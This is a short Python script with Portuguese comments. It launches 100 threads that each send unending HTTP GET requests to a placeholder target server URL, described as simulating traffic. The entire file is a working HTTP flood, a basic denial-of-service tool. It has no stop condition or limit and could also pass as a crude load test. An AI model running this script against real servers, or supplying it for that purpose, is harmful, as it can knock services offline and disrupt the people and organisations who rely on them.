import requests
from threading import Thread
import time

# Defina o endereço do servidor alvo (substitua pelo endereço IP local do servidor)
target_url = "http://[localip]"  # Exemplo: "http://192.168.1.10"
num_threads = 100  # Quantidade de threads simultâneas
delay_between_requests = 0.1  # Delay opcional entre as requisições (segundos)

def send_requests():
    while True:
        try:
            response = requests.get(target_url)
            print(f"Requisição enviada! Status: {response.status_code}")
            time.sleep(delay_between_requests)  # Pequeno intervalo entre as requisições
        except requests.exceptions.RequestException as e:
            print(f"Erro ao conectar ao servidor: {e}")

# Criar múltiplas threads para simular o tráfego
for i in range(num_threads):
    thread = Thread(target=send_requests)
    thread.daemon = True
    thread.start()

# Manter o script rodando
while True:
    time.sleep(1)
